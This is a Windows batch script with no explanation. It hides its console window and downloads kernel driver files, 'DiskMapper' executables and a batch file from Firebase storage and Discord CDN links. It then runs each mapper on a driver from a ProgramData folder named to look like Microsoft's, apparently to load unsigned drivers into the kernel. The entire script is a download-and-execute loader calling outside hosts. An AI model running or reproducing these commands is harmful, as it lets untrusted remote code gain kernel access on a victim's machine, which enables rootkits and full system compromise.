powershell -window hidden -command ""
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/Disk122.sys?alt=media&token=811a32e5-c676-428c-9d66-cce0c34080e7', 'Disk122.sys')"
powershell -Command "Invoke-WebRequest https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/Disk122.sys?alt=media&token=811a32e5-c676-428c-9d66-cce0c34080e7 -OutFile Disk122.sys"

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/DiskMapper22.exe?alt=media&token=34204e6b-ecb3-4dd6-b835-f01b18535091', 'DiskMapper22.exe')"
powershell -Command "Invoke-WebRequest https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/DiskMapper22.exe?alt=media&token=34204e6b-ecb3-4dd6-b835-f01b18535091 -OutFile DiskMapper22.exe"

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/Disk12.sys?alt=media&token=8df00ad3-fab2-4475-ba04-49127f7328f8', 'Disk12.sys')"
powershell -Command "Invoke-WebRequest https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/Disk12.sys?alt=media&token=8df00ad3-fab2-4475-ba04-49127f7328f8 -OutFile Disk12.sys"

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/DiskMapper2.exe?alt=media&token=7db486f8-7764-4803-a766-39b59ab188d3', 'DiskMapper2.exe')"
powershell -Command "Invoke-WebRequest https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/DiskMapper2.exe?alt=media&token=7db486f8-7764-4803-a766-39b59ab188d3 -OutFile DiskMapper2.exe"

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/Disk333.sys?alt=media&token=1761808d-2c76-4636-8d01-dd574e53723a', 'Disk333.sys')"
powershell -Command "Invoke-WebRequest https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/Disk333.sys?alt=media&token=1761808d-2c76-4636-8d01-dd574e53723a -OutFile Disk333.sys"

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/DiskMapper333.exe?alt=media&token=f74bc85d-ce09-4ae8-ac8b-8af0a2baf253', 'DiskMapper333.exe')"
powershell -Command "Invoke-WebRequest https://firebasestorage.googleapis.com/v0/b/website-48128.appspot.com/o/DiskMapper333.exe?alt=media&token=f74bc85d-ce09-4ae8-ac8b-8af0a2baf253 -OutFile DiskMapper333.exe"

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn.discordapp.com/attachments/966662662949830676/1028847731957047426/Del_Driver_1.bat', 'Del_Driver_1.bat')"
powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/966662662949830676/1028847731957047426/Del_Driver_1.bat -OutFile Del_Driver_1.bat"

CD C:\ProgramData\regid.1991-06.com.microsoft\Premium
start DiskMapper22.exe Disk122.sys
start DiskMapper2.exe Disk12.sys
start DiskMapper333.exe Disk333.sys
powershell -window normal -command ""


